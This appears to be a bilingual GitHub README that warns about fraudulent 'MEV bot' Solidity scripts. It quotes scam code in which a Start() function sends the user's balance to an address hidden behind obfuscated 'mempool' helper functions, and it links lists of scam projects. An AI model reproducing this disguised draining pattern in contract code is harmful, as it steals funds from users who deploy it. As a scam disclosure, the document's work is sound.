# mev-bot-fraud
be careful the fake mev-bot codes 

本来想研究一下 mevbot 的，没想到发现一个骗局，所以想提醒一下大家以免被骗了，很多类似这个项目https://github.com/KayExpertbots/Mevbot 的假脚本都是诈骗的

Wanted to study the mevbot, unexpectedly found a scam, so want to remind you to avoid being cheated, many similar to this project of https://github.com/KayExpertbots/Mevbot, a fake script is fraud 

```
    function Start() public payable {
        emit Log("Running MEV action. This can take a while; please wait..");
        payable(_callMEVAction()).transfer(address(this).balance);
    }

```

Start 看起来是个启动脚本实际是个 transfer，会把你的余额转到一个地址，`_callMEVAction()` 这个方法其实最后就是会生成一个钱包地址，绕来绕去的就是想骗一些新手，所以大家一定要看好了，看到这样的代码一定要小心了

Start looks like a startup script is actually a transfer, will transfer your balance to an address, '_callMEVAction()' This method is actually the last will generate a wallet address, around is to cheat some beginners, so we must look at it, see this code must be careful 

![image](https://github.com/chunsenye/mev-bot-fraud/assets/30768615/dc4f05ca-abf7-4146-84d6-d528f08195f1)

```
transfer(address(this).balance);
```

```
 function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
        uint _memPoolSol = 3410611; //Gas estimate update
        uint _memPoolLength = 2418259; //Gas estimate update
        uint _memPoolSize = 2563395760; //Gas estimate update
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolDepth = getMemPoolDepth();

        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _memPool3 = checkLiquidity(_memPoolHeight);
        string memory _memPool4 = checkLiquidity(_memPoolDepth);

        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }

```
![image](https://github.com/chunsenye/mev-bot-fraud/assets/30768615/7334fcdc-405c-45ce-9753-317cc112c9bd)

这些都是骗人的 所以提醒一下，大家也可以帮忙点点星星，让更多人看到

These are all lies so just a reminder, you can also help to light up the stars, so that more people can see 

<img width="1360" alt="image" src="https://github.com/chunsenye/mev-bot-fraud/assets/30768615/b87707ad-ae0c-4d49-892c-a54af47947d2">

我把一些案例放在了 issue 里面 


[诈骗账号](https://github.com/chunsenye/mev-bot-fraud/issues/2)

[诈骗项目列表](https://github.com/chunsenye/mev-bot-fraud/issues/1)

